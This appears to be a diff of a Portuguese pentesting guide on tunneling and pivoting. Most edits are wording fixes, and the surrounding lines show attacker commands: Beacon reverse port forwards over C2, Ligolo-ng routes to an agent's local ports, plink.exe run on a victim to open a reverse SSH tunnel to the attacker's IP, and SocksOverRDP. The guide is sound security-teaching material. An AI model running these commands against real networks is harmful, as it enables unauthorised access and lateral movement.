@@ -92,7 +92,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Habilite o encaminhamento no lado do Servidor
+Habilite o encaminhamento no lado do servidor
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -167,9 +167,9 @@ rportfwd stop [bind port]
 ```
 Para notar:
 
-* O **reencaminhamento de porta reversa do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para relatar entre máquinas individuais**.
-* O tráfego é **tunelado dentro do tráfego C2 do Beacon**, incluindo links P2P.
-* **Privilégios de administrador não são necessários** para criar reencaminhamentos de porta reversa em portas altas.
+* O **reverso de porta do Beacon** é projetado para **túnel de tráfego para o Servidor da Equipe, não para retransmitir entre máquinas individuais**.
+* O tráfego é **tuneado dentro do tráfego C2 do Beacon**, incluindo links P2P.
+* **Privilégios de administrador não são necessários** para criar reversos de porta em portas altas.
 
 ### rPort2Port local
 
@@ -242,6 +242,12 @@ interface_list
 listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
+```
+### Acessar Portas Locais do Agente
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
 ```
 ## Rpivot
 
@@ -332,7 +338,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 É como uma versão de console do PuTTY (as opções são muito semelhantes a um cliente ssh).
 
-Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço e porta ssh para que possamos ter uma conexão reversa. Então, para encaminhar apenas uma porta acessível localmente para uma porta em nossa máquina:
+Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço e porta ssh para que possamos ter uma conexão reversa. Então, para encaminhar apenas a porta acessível localmente para uma porta em nossa máquina:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -364,7 +370,7 @@ No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Agora podemos **conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** informando que o **plugin SocksOverRDP está habilitado**, e ele irá **escutar** em **127.0.0.1:1080**.
+Agora podemos **conectar** ao **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** dizendo que o **plugin SocksOverRDP está habilitado**, e ele irá **escutar** em **127.0.0.1:1080**.
 
 **Conecte-se** via **RDP** e faça o upload e execute no computador da vítima o binário `SocksOverRDP-Server.exe`:
 ```
@@ -393,7 +399,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ele se autentica contra um proxy e vincula uma porta local que é encaminhada para o serviço externo que você especificar. Então, você pode usar a ferramenta de sua escolha através dessa porta.\
+Ele autentica contra um proxy e vincula uma porta local que é encaminhada para o serviço externo que você especificar. Então, você pode usar a ferramenta de sua escolha através dessa porta.\
 Por exemplo, encaminhe a porta 443.
 ```
 Username Alice
@@ -452,7 +458,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Mudar o DNS do proxychains
 
-Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (codificado). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
+Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (codificado). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
 
 ## Túneis em Go
 
@@ -523,7 +529,7 @@ _Também é possível adicionar autenticação e TLS, se necessário._
 ```
 #### Capturando chamadas HTTP
 
-_Util útil para XSS, SSRF, SSTI ..._\
+_Utilizado para XSS, SSRF, SSTI ..._\
 Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunelando serviço HTTP interno
